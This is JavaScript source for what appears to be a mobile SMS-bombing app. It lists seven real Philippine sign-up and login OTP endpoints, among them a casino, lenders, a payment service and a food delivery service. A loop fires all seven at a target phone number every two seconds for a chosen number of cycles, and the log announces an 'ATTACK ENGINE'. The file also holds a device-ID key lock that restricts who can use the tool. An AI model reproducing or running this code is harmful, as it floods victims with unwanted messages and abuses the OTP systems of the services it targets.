const apiList = [
    { name: "LAKIWIN", fire: (t) => axios.post("https://www.lakiwin.com/service/mobile/check", {"phoneNumber": "0" + t, "otpType": "LOGIN_OTP"}, {headers: {"Content-Type": "application/json;charset=UTF-8"}, timeout: 10000}) },
    { name: "S5_CASINO", fire: (t) => axios.post("https://api.s5.com/player/api/v1/otp/request", "phone_number=%2B63" + t, {headers: {"Content-Type": "application/x-www-form-urlencoded"}, timeout: 10000}) },
    { name: "FINBRO", fire: (t) => axios.post("https://api.finbro.ph/web/public/client/phone/sms-code", {"mobilePhone": {"number": "0" + t}}, {headers: {"Content-Type": "application/json;charset=UTF-8"}, timeout: 10000}) },
    { name: "BISTRO", fire: (t) => axios.post("https://bistrodelivers.com.ph/p/api/s/v2/brand_venues/bvhvXayDs85SAFAZo6g6qctA/customers/otp", {"phone_number": t, "dial_code": "+63", "phone_country": "PH", "channel": "sms"}, {headers: {"Content-Type": "application/json"}, timeout: 10000}) },
    { name: "BAYAD", fire: (t) => axios.post("https://api.online.bayad.com/api/sign-up/otp", {"mobileNumber": "+63" + t, "emailAddress": "u" + Math.floor(Math.random() * 99) + "@gmail.com"}, {timeout: 5000}) },
    { name: "FASTCASH", fire: (t) => axios.post("https://api.fastcash.ph/v1/auth/otp", {"phone_number": "63" + t}, {headers: {"Content-Type": "application/json"}, timeout: 25000}) },
    { name: "CARMUDI", fire: (t) => axios.post("https://ucrf.carbay.com/sms/send-otp?countryCode=ph&langCode=en&businessUnit=cars&currencyCode=%E2%82%B1&isdCode=%2B63&pageType=used_lead&categoryId=1", {"otp": "", "mobile": t, "name": "jared", "siteName": "www.carmudi.com.ph", "businessUnit": "cars", "categoryId": "1", "countryCode": "ph", "currencyCode": "₱", "isdCode": "+63", "langCode": "en", "pageType": "used_lead"}, {headers: {"content-type": "application/json; charset=UTF-8"}, timeout: 10000}) }
];

async function checkAccess() {
    const { identifier } = await Capacitor.Plugins.Device.getId();
    const expectedKey = identifier + "JARED";
    if (identifier === "a6604ff06fa2e862" || localStorage.getItem("user_access_token") === expectedKey) {
        document.getElementById('main-app-interface').style.display = 'block';
        return;
    }
    const userKey = prompt("DEVICE ID: " + identifier + "\n\nRESTRICTED ACCESS: Enter Key to unlock.");
    if (userKey === expectedKey) {
        localStorage.setItem("user_access_token", userKey);
        document.getElementById('main-app-interface').style.display = 'block';
    } else {
        window.location.href = "https://www.facebook.com/jaredvxx";
    }
}
window.onload = checkAccess;

async function start() {
    const num = document.getElementById('num').value;
    const amount = document.getElementById('otpAmount').value;
    const log = document.getElementById('log');

    if(!num || num.length < 10) {
        alert("ERROR: Enter 10-digit number.");
        return;
    }

    log.innerHTML = "[+] ATTACK ENGINE ENGAGED...<br>";

    for(let i=1; i<=amount; i++) {
        log.innerHTML += "[CYCLE #" + i + "] Dispatching 7 APIs...<br>";
        
        // Pinapatakbo lahat ng 7 APIs nang sabay-sabay (Multi-Threaded)
        const promises = apiList.map(api => 
            api.fire(num).then(() => {
                log.innerHTML += "<span style='color: #0f0;'>[SUCCESS] " + api.name + " Delivered.</span><br>";
            }).catch(() => {
                log.innerHTML += "<span style='color: #f00;'>[FAILED] " + api.name + " Blocked.</span><br>";
            })
        );

        await Promise.all(promises);
        log.scrollTop = log.scrollHeight;
        await new Promise(r => setTimeout(r, 2000));
    }
    log.innerHTML += "[!] ALL TASKS FINISHED.<br>";
}
